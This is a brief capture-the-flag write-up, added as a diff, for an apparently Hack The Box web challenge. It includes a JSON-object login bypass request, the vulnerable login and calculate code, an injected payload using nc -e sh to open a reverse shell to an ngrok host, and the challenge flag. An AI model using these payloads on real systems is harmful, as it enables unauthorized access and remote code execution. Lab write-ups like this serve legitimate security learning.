@@ -1,0 +1,54 @@
+access: 144.126.206.249:32481
+bypass login:
+
+POST /api/login HTTP/1.1
+Host: 144.126.206.249:32481
+Content-Length: 48
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: http://144.126.206.249:32481
+Referer: http://144.126.206.249:32481/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+{"username":"admin","password": {"password": 1}}
+
+using this payload bypass using sql injection:
+{"username":"admin","password": {"password": 1}}
+
+some vulnerabilities code:
+async loginUser(user, pass) {
+    return new Promise(async (resolve, reject) => {
+        let stmt = 'SELECT username FROM users WHERE username = ? AND password = ?';
+        this.connection.query(stmt, [user, pass], (err, result) => {
+            if(err || result.length == 0)
+                reject(err)
+            resolve(result)
+        })
+    });
+}
+
+rce on calculate:
+const calculate = (activity, health, weight, happiness) => {
+return new Promise(async (resolve, reject) => {
+    try {
+        // devine formula :100:
+        let res = `with(a='${activity}', hp=${health}, w=${weight}, hs=${happiness}) {
+            if (a == 'feed') { hp += 1; w += 5; hs += 3; } if (a == 'play') { w -= 5; hp += 2; hs += 3; } if (a == 'sleep') { hp += 2; w += 3; hs += 3; } if ((a == 'feed' || a == 'sleep' ) && w > 70) { hp -= 10; hs -= 10; } else if ((a == 'feed' || a == 'sleep' ) && w < 40) { hp += 10; hs += 5; } else if (a == 'play' && w < 40) { hp -= 10; hs -= 10; } else if ( hs > 70 && (hp < 40 || w < 30)) { hs -= 10; }  if ( hs > 70 ) { m = 'kissy' } else if ( hs < 40 ) { m = 'cry' } else { m = 'awkward'; } if ( hs > 100) { hs = 100; } if ( hs < 5) { hs = 5; } if ( hp < 5) { hp = 5; } if ( hp > 100) { hp = 100; }  if (w < 10) { w = 10 } return {m, hp, w, hs}
+            }`;
+
+payload on /api/activity:
+{
+  "activity": "sleep'+(global.process.mainModule.require('child_process').execSync('nc ngrok_ip ngrok_port -e sh'))+'",
+  "health": "52",
+  "weight": "37",
+  "happiness": "43"
+}
+
+cat flag.txt
+HTB{s0rry_1m_n07_1nt0_typ3_ch3ck5}
+
+resource:
+https://gist.github.com/pich4ya/c033a1d147f8eb0348c10ed1a44fc2dc
